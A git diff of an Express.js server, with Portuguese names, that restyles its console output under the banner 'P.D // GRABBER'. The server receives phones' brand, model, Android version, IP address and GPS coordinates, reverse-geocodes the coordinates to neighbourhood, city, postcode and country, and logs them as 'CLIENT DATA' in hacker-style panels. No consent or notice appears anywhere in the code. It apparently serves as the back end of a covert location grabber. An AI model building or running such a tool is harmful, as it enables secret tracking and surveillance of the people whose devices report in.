@@ -6,6 +6,96 @@ app.use(express.json());
 
 const PORT = process.env.PORT || 10000;
 
+
+// ============================================================
+//                    P.D // GRABBER
+// ============================================================
+
+function logInicializacao() {
+    console.log(`
+P.D::CORE > ./initialize
+
+================================================
+                                                
+[+] CORE....................OK                  
+[+] NETWORK.................OK
+[+] SOCKET..................OK
+[+] LISTENER................OK
+
+P.D::CORE > ./listen
+
+01010100 01010010 01000001 01000011 01000101
+
+>>> WAITING FOR CONNECTION <<<
+
+===============================================
+
+`);
+}
+
+
+function logConexao(dados) {
+
+    const hora = new Date().toLocaleTimeString("pt-BR");
+
+    console.log(`
+╔══════════════════════════════════════════════════════════╗
+║                  P.D // CLIENT                           ║
+╚══════════════════════════════════════════════════════════╝
+
+[${hora}] >>> CONNECTION DETECTED <<<
+
+P.D::CORE > ./decode
+
+[+] RECEIVING PACKET........OK
+[+] DECODING DATA...........OK
+[+] VALIDATING..............OK
+[+] SESSION.................OK
+
+────────────────────────────────────────────────────────────
+                     CLIENT DATA
+────────────────────────────────────────────────────────────
+
+  BRAND       = ${dados.marca}
+  MANUFACTURER= ${dados.fabricante}
+  MODEL       = ${dados.modelo}
+  ANDROID     = ${dados.android}
+  IP          = ${dados.ip}
+`);
+
+}
+
+
+function logLocalizacao(dados) {
+
+    console.log(`
+────────────────────────────────────────────────────────────
+                    LOCATION DATA
+────────────────────────────────────────────────────────────
+
+  CITY        = ${dados.cidade}
+  STATE       = ${dados.estado}
+  CEP         = ${dados.cep}
+  COUNTRY     = ${dados.pais}
+  NEIGHBORHOOD= ${dados.bairro}
+
+────────────────────────────────────────────────────────────
+
+>>> DECODE COMPLETE
+
+[✓] CLIENT ONLINE
+[✓] DATA RECEIVED
+[✓] SESSION ACTIVE
+
+P.D::CORE > _
+`);
+}
+
+
+// ============================================================
+// BUSCAR ENDEREÇO
+// ============================================================
+
 async function buscarEndereco(latitude, longitude) {
 
     const url =
@@ -31,6 +121,11 @@ async function buscarEndereco(latitude, longitude) {
     return await resposta.json();
 }
 
+
+// ============================================================
+// RECEBER DISPOSITIVO
+// ============================================================
+
 app.post("/api/device", async (req, res) => {
 
     try {
@@ -48,48 +143,36 @@ app.post("/api/device", async (req, res) => {
 
         ip = ip.replace("::ffff:", "");
 
-        console.log("");
-        console.log("========================================");
-        console.log("       NOVO DISPOSITIVO CONECTADO");
-        console.log("========================================");
 
-        console.log(
-            "Marca:       ",
-            dados.marca || "Não informado"
-        );
+        // ----------------------------------------------------
+        // LOG DO DISPOSITIVO
+        // ----------------------------------------------------
 
-        console.log(
-            "Fabricante:  ",
-            dados.fabricante || "Não informado"
-        );
+        logConexao({
+            marca: dados.marca || "Não informado",
+            fabricante: dados.fabricante || "Não informado",
+            modelo: dados.modelo || "Não informado",
+            android: dados.android || "Não informado",
+            ip: ip
+        });
 
-        console.log(
-            "Modelo:      ",
-            dados.modelo || "Não informado"
-        );
 
-        console.log(
-            "Android:     ",
-            dados.android || "Não informado"
-        );
-
-        console.log(
-            "IP:          ",
-            ip
-        );
+        // ----------------------------------------------------
+        // LOCALIZAÇÃO
+        // ----------------------------------------------------
 
         const latitude = dados.latitude;
         const longitude = dados.longitude;
+
 
         if (
             typeof latitude === "number" &&
             typeof longitude === "number"
         ) {
 
-            console.log("");
-            console.log("COORDENADAS:");
-            console.log("Latitude:    ", latitude);
-            console.log("Longitude:   ", longitude);
+            console.log(
+                `  COORDINATES = ${latitude}, ${longitude}`
+            );
 
             try {
 
@@ -102,11 +185,13 @@ app.post("/api/device", async (req, res) => {
                 const address =
                     endereco.address || {};
 
+
                 const bairro =
                     address.suburb ||
                     address.neighbourhood ||
                     address.village ||
                     "Não informado";
+
 
                 const cidade =
                     address.city ||
@@ -115,102 +200,109 @@ app.post("/api/device", async (req, res) => {
                     address.village ||
                     "Não informada";
 
+
                 const estado =
                     address.state ||
                     "Não informado";
+
 
                 const cep =
                     address.postcode ||
                     "Não informado";
 
+
                 const pais =
                     address.country ||
                     "Não informado";
 
-                console.log("");
-                console.log("LOCALIZAÇÃO APROXIMADA:");
-                console.log(
-                    "Bairro:      ",
-                    bairro
-                );
-                console.log(
-                    "Cidade:      ",
-                    cidade
-                );
-                console.log(
-                    "Estado:      ",
-                    estado
-                );
-                console.log(
-                    "CEP:         ",
-                    cep
-                );
-                console.log(
-                    "País:        ",
-                    pais
-                );
 
-                console.log("");
-                console.log(
-                    "Endereço retornado pelo serviço:"
-                );
-                console.log(
-                    endereco.display_name ||
-                    "Não informado"
-                );
+                logLocalizacao({
+                    bairro: bairro,
+                    cidade: cidade,
+                    estado: estado,
+                    cep: cep,
+                    pais: pais
+                });
+
 
             } catch (erroEndereco) {
 
-                console.error(
-                    "Erro ao consultar localização:",
-                    erroEndereco.message
-                );
+                console.error(`
+P.D::CORE > ./location
+
+[!] LOCATION LOOKUP FAILED
+[!] ${erroEndereco.message}
+
+P.D::CORE > _
+`);
             }
+
 
         } else {
 
-            console.log("");
-            console.log(
-                "Localização não enviada pelo aplicativo."
-            );
+            console.log(`
+────────────────────────────────────────────────────────────
+
+[!] LOCATION DATA NOT AVAILABLE
+
+────────────────────────────────────────────────────────────
+
+[✓] CLIENT ONLINE
+[✓] DATA RECEIVED
+
+P.D::CORE > _
+`);
+
         }
 
-        console.log("");
-        console.log("========================================");
-        console.log("");
 
         res.status(200).json({
             sucesso: true
         });
 
+
     } catch (erro) {
 
-        console.error(
-            "Erro ao processar dispositivo:",
-            erro
-        );
+        console.error(`
+╔══════════════════════════════════════════════════════════╗
+║                    P.D // ERROR                         ║
+╚══════════════════════════════════════════════════════════╝
+
+[!] ERROR PROCESSING CLIENT
+
+${erro.message}
+
+P.D::CORE > _
+`);
 
         res.status(500).json({
             sucesso: false
         });
+
     }
+
 });
+
+
+// ============================================================
+// ROTA PRINCIPAL
+// ============================================================
 
 app.get("/", (req, res) => {
 
     res.status(200).send(
-        "Servidor funcionando!"
+        "P.D // Server online"
     );
+
 });
+
+
+// ============================================================
+// INICIAR SERVIDOR
+// ============================================================
 
 app.listen(PORT, "0.0.0.0", () => {
 
-    console.log("");
-    console.log("========================================");
-    console.log("       SERVIDOR INICIADO");
-    console.log("========================================");
-    console.log("Porta:", PORT);
-    console.log("Aguardando dispositivos...");
-    console.log("");
+    logInicializacao();
 
 });
